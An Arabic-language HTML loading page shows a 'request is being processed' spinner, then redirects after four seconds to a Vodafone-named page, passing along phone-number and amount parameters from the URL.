<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري التنفيذ</title>
    <link rel="stylesheet" href="style.css">
    <link rel="preload" href="sound-consvi.mp3" as="audio">
</head>
<body>
    <div class="app page-red" style="display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh;">
        <div class="spinner" style="width: 45px; height: 45px; margin-bottom: 25px;"></div>
        <div class="header-title" style="font-size: 20px;">جاري تنفيذ طلبك...</div>
        <div class="header-subtitle" style="font-size: 14px; opacity: 0.8; margin-top: 8px;">برجاء عدم إغلاق هذه الصفحة</div>
    </div>

    <script>
        const params = new URLSearchParams(window.location.search);
        const phone = params.get('phone');
        const amount = params.get('amount');
        
        window.onload = function() {
            setTimeout(() => {
                window.location.href = 'ar-vodafone.html?phone=' + encodeURIComponent(phone) + '&amount=' + encodeURIComponent(amount);
            }, 4000);
        };
    </script>
</body>
</html>
